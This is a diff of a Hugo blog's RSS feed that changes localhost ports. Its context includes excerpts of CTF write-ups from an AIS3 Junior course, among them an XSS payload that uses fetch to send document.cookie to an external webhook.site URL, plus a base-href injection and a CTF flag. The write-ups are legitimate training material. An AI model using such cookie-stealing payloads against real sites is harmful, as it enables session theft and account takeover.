@@ -2,18 +2,18 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Agong&#39;s Blog</title>
-        <link>http://localhost:50608/en/post/</link>
+        <link>http://localhost:1313/en/post/</link>
         <description>Recent content in Posts on Agong&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>Chun-Hao Chung</copyright>
-        <lastBuildDate>Sat, 25 Oct 2025 00:00:00 +0800</lastBuildDate><atom:link href="http://localhost:50608/en/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 25 Oct 2025 00:00:00 +0800</lastBuildDate><atom:link href="http://localhost:1313/en/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Proxmark3 Chinese Tutorial</title>
-        <link>http://localhost:50608/en/post/proxmark3-chinese-tutorial/</link>
+        <link>http://localhost:1313/en/post/proxmark3-chinese-tutorial/</link>
         <pubDate>Sat, 25 Oct 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/proxmark3-chinese-tutorial/</guid>
-        <description>&lt;img src="http://localhost:50608/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/1.jpg" alt="Featured image of post Proxmark3 Chinese Tutorial" /&gt;&lt;p&gt;This is my birthday present for myself (?)&lt;br&gt;
+        <guid>http://localhost:1313/en/post/proxmark3-chinese-tutorial/</guid>
+        <description>&lt;img src="http://localhost:1313/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/1.jpg" alt="Featured image of post Proxmark3 Chinese Tutorial" /&gt;&lt;p&gt;This is my birthday present for myself (?)&lt;br&gt;
 I&amp;rsquo;ll post it later when I have time after selecting the articles.&lt;br&gt;
 Mainly because I saw there were no tutorials in Chinese, I wanted to write a detailed Chinese user manual.&lt;br&gt;
 I&amp;rsquo;ll see if I can write about next year&amp;rsquo;s Ironman race.&lt;/p&gt;
@@ -21,20 +21,20 @@ I&amp;rsquo;ll see if I can write about next year&amp;rsquo;s Ironman race.&lt;/
         </item>
         <item>
         <title>2025 Education System Cybersecurity Attack and Defense Inspector </title>
-        <link>http://localhost:50608/en/post/2025-education-system-cybersecurity-attack-and-defense-inspector/</link>
+        <link>http://localhost:1313/en/post/2025-education-system-cybersecurity-attack-and-defense-inspector/</link>
         <pubDate>Tue, 19 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2025-education-system-cybersecurity-attack-and-defense-inspector/</guid>
+        <guid>http://localhost:1313/en/post/2025-education-system-cybersecurity-attack-and-defense-inspector/</guid>
         <description>&lt;img src="https://www.taccst.moe.edu.tw/static/img/back1.jpg" alt="Featured image of post 2025 Education System Cybersecurity Attack and Defense Inspector " /&gt;&lt;p&gt;Just kidding, I tricked you into clicking! Haha&lt;br&gt;
 How could I possibly reveal any content when I&amp;rsquo;ve signed an NDA?&lt;br&gt;
 But I can talk about other stuff though&lt;br&gt;
 Like how we get different lunches every day, plus bubble tea, and there are also little cookies to snack on&lt;br&gt;
 Full transportation reimbursement, and accommodation at pretty nice hotels too (but you need to book early&lt;br&gt;
 &lt;del&gt;You can also take the opportunity to go sightseeing in Hsinchu&lt;/del&gt;&lt;br&gt;
-&lt;img src=&#34;http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image.png&#34;
+&lt;img src=&#34;http://localhost:1313/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image.png&#34;
 	width=&#34;1671&#34;
 	height=&#34;1480&#34;
-	srcset=&#34;http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1d57ffb0e20b92a2.png 480w, http://localhost:50608/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1642b947cc19ed7e.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1d57ffb0e20b92a2.png 480w, http://localhost:1313/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/image_hu_1642b947cc19ed7e.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;I just looked this up&#34;
@@ -49,11 +49,11 @@ Full transportation reimbursement, and accommodation at pretty nice hotels too (
         </item>
         <item>
         <title>2025 AIS3 Junior Web Back-end Writeup</title>
-        <link>http://localhost:50608/en/post/2025-ais3-junior-web-back-end-writeup/</link>
+        <link>http://localhost:1313/en/post/2025-ais3-junior-web-back-end-writeup/</link>
         <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2025-ais3-junior-web-back-end-writeup/</guid>
-        <description>&lt;img src="http://localhost:50608/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png" alt="Featured image of post 2025 AIS3 Junior Web Back-end Writeup" /&gt;&lt;h3 id=&#34;phpisbest&#34;&gt;phpisbest
+        <guid>http://localhost:1313/en/post/2025-ais3-junior-web-back-end-writeup/</guid>
+        <description>&lt;img src="http://localhost:1313/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png" alt="Featured image of post 2025 AIS3 Junior Web Back-end Writeup" /&gt;&lt;h3 id=&#34;phpisbest&#34;&gt;phpisbest
 &lt;/h3&gt;&lt;p&gt;After entering, you will see the following codes&lt;br&gt;
 &lt;img src=&#34;https://hackmd.io/_uploads/B1YY3MOOll.png&#34;
 	
@@ -308,10 +308,10 @@ Finally &lt;code&gt;cat /flag&lt;/code&gt;&lt;br&gt;
         </item>
         <item>
         <title>2025 AIS3 Junior Web Front-end Writeup</title>
-        <link>http://localhost:50608/en/post/2025-ais3-junior-web-front-end-writeup/</link>
+        <link>http://localhost:1313/en/post/2025-ais3-junior-web-front-end-writeup/</link>
         <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2025-ais3-junior-web-front-end-writeup/</guid>
+        <guid>http://localhost:1313/en/post/2025-ais3-junior-web-front-end-writeup/</guid>
         <description>&lt;h2 id=&#34;lab1&#34;&gt;Lab1
 &lt;/h2&gt;&lt;h3 id=&#34;get-ahead&#34;&gt;GET aHEAD
 &lt;/h3&gt;&lt;p&gt;The color change is because the HTTP Method is different.&lt;br&gt;
@@ -528,10 +528,10 @@ He said he wanted to delete it, so &lt;code&gt;rm flag&lt;/code&gt;&lt;br&gt;
 &lt;h2 id=&#34;lab3&#34;&gt;Lab3
 &lt;/h2&gt;&lt;h3 id=&#34;xss1&#34;&gt;XSS1
 &lt;/h3&gt;&lt;p&gt;First, alert(123) to see if there is an XSS vulnerability.&lt;br&gt;
-&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1.png&#34;
+&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1.png&#34;
 	width=&#34;858&#34;
 	height=&#34;244&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_b2d36386b0a33ec3.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_6c1074c47458715b.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_b2d36386b0a33ec3.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_6c1074c47458715b.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -553,10 +553,10 @@ Successfully appeared, then try to look at the document.cookie of fetch and demo
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/script&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2.png&#34;
 	width=&#34;877&#34;
 	height=&#34;842&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_419fb31979a0a70f.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_f3a677ea8d738d.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_419fb31979a0a70f.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_f3a677ea8d738d.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -566,10 +566,10 @@ Successfully appeared, then try to look at the document.cookie of fetch and demo
 	
 &gt;&lt;br&gt;
 If you get the request, copy it to the admin.&lt;br&gt;
-&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3.png&#34;
+&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3.png&#34;
 	width=&#34;1073&#34;
 	height=&#34;649&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_88b303db64dbbf05.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_89bd5ec331bd6009.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_88b303db64dbbf05.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_89bd5ec331bd6009.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -591,10 +591,10 @@ If you get the request, copy it to the admin.&lt;br&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Same as above, pass it to admin&lt;br&gt;
-&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4.png&#34;
+&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4.png&#34;
 	width=&#34;1176&#34;
 	height=&#34;647&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_a3ba054c814ceef1.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_6f56b97ad340bead.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_a3ba054c814ceef1.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_6f56b97ad340bead.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -607,10 +607,10 @@ If you get the request, copy it to the admin.&lt;br&gt;
 &lt;p&gt;&lt;code&gt;Flag:NCKUCTF{1nn3rh7ml_15_n07_3x3cu73_5cr1p7}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
 &lt;h3 id=&#34;xss3&#34;&gt;XSS3
 &lt;/h3&gt;&lt;p&gt;First, throw a random payload and find that it is a hyperlink written on the button.&lt;br&gt;
-&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5.png&#34;
+&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5.png&#34;
 	width=&#34;695&#34;
 	height=&#34;361&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_4217b133355145a0.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_7ac543a0b1cd2f7e.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_4217b133355145a0.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_7ac543a0b1cd2f7e.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -622,10 +622,10 @@ If you get the request, copy it to the admin.&lt;br&gt;
 Then write another &lt;code&gt;javascript:&lt;/code&gt; to update the properties&lt;br&gt;
 payload:&lt;code&gt;javascript:fetch(&#39;https://webhook.site/c08f7142-7637-4b38-b480-1343addd04c0?&#39;+encodeURIComponent(document.cookie))&lt;/code&gt;&lt;br&gt;
 Finally, throw it to the admin to get the flag&lt;br&gt;
-&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6.png&#34;
+&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6.png&#34;
 	width=&#34;1014&#34;
 	height=&#34;840&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_5ee1a269c026ef49.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_7b415012f6228630.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_5ee1a269c026ef49.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_7b415012f6228630.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -662,16 +662,16 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
         </item>
         <item>
         <title>2025 AIS3 Junior&#39;s Experience</title>
-        <link>http://localhost:50608/en/post/2025-ais3-juniors-experience/</link>
+        <link>http://localhost:1313/en/post/2025-ais3-juniors-experience/</link>
         <pubDate>Wed, 13 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2025-ais3-juniors-experience/</guid>
-        <description>&lt;img src="http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 Junior&#39;s Experience" /&gt;&lt;h1 id=&#34;day-0&#34;&gt;Day 0
+        <guid>http://localhost:1313/en/post/2025-ais3-juniors-experience/</guid>
+        <description>&lt;img src="http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 Junior&#39;s Experience" /&gt;&lt;h1 id=&#34;day-0&#34;&gt;Day 0
 &lt;/h1&gt;&lt;p&gt;We left COSCUP quite early that day and headed south (for the direct train, it was really fast).&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1.png&#34;
 	width=&#34;927&#34;
 	height=&#34;535&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_babe71d045664c90.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_b7bbb1b94ecfe129.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_babe71d045664c90.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_b7bbb1b94ecfe129.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;High-speed rail timetable&#34;
@@ -682,10 +682,10 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
 		data-flex-basis=&#34;415px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1536&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_af401f887aaae84b.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_3465c0e82947d423.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_af401f887aaae84b.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_3465c0e82947d423.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Probably Taichung?&#34;
@@ -697,10 +697,10 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;It was lunchtime when we arrived at NCKU, but the two teaching assistants hadn&amp;rsquo;t arrived yet, so I took another team member to join the other groups for lunch.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2.png&#34;
 	width=&#34;784&#34;
 	height=&#34;266&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_ee111eb5c506c578.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_2e1decde96437509.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_ee111eb5c506c578.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_2e1decde96437509.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -709,10 +709,10 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
 		data-flex-basis=&#34;707px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_ec11698e61685de1.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_59bc67b3d24cbf7a.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_ec11698e61685de1.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_59bc67b3d24cbf7a.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Dinner, the beginning of the nightmare。元味屋和風洋食&#34;
@@ -726,10 +726,10 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/4iphDfHaXEv6QzB16&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;元味屋和風洋食&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;After returning home, I saw that TA was busy with the topic, so we had a small discussion about what to do, and it became their game space.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_55706e787dd2667d.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_2d077fe48495da27.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_55706e787dd2667d.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_2d077fe48495da27.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;TAs play a certain galgame&#34;
@@ -742,10 +742,10 @@ payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/Jav
 &gt;&lt;/p&gt;
 &lt;h1 id=&#34;day-1&#34;&gt;Day 1
 &lt;/h1&gt;&lt;p&gt;The class was nothing special, but the food was really a food paradise near National Cheng Kung University. It was completely different from what it was two weeks ago.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_3cbd6d1748d3bc5a.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_72d87226f0511789.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_3cbd6d1748d3bc5a.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_72d87226f0511789.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Lunch。井選日式定食teisyoku tainan&#34;
@@ -765,10 +765,10 @@ The hamburger patty was a little pink, but I ate it anyway.&lt;br&gt;
 Later I developed acute gastroenteritis. I had diarrhea no matter what I ate, and I also had diarrhea even if I didn&amp;rsquo;t eat. I felt very uncomfortable for the next few days.&lt;br&gt;
 But I still have to go eat what I didn&amp;rsquo;t get to this morning&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/AmhBAreU4wRBUTm88&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;勝利早點&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_805db4aa63a782ce.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_5d067295ed50a0c8.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_805db4aa63a782ce.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_5d067295ed50a0c8.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Is this… Tainan?&#34;
@@ -779,10 +779,10 @@ But I still have to go eat what I didn&amp;rsquo;t get to this morning&lt;a clas
 		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8.jpg&#34;
 	width=&#34;1080&#34;
 	height=&#34;1920&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_2797fc2695e26525.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_b1da9394274ed053.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_2797fc2695e26525.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_b1da9394274ed053.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Tastes ordinary but pretty cheap&#34;
@@ -795,10 +795,10 @@ But I still have to go eat what I didn&amp;rsquo;t get to this morning&lt;a clas
 &gt;&lt;/p&gt;
 &lt;h1 id=&#34;day-3&#34;&gt;Day 3
 &lt;/h1&gt;&lt;p&gt;Just go to class, but.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_d1ff8246fc5e62bf.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_3393b3d331d7e91d.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_d1ff8246fc5e62bf.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_3393b3d331d7e91d.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Woohoo, so sad&#34;
@@ -809,10 +809,10 @@ But I still have to go eat what I didn&amp;rsquo;t get to this morning&lt;a clas
 		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3.png&#34;
 	width=&#34;1799&#34;
 	height=&#34;1560&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_a31e94b9ab2b9f0e.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_ef64e3e75d65acad.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_a31e94b9ab2b9f0e.png 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_ef64e3e75d65acad.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Yay! No more staying up late to make presentations while having a stomachache!&#34;
@@ -826,10 +826,10 @@ But I still have to go eat what I didn&amp;rsquo;t get to this morning&lt;a clas
 &lt;h1 id=&#34;day-46&#34;&gt;Day 4~6
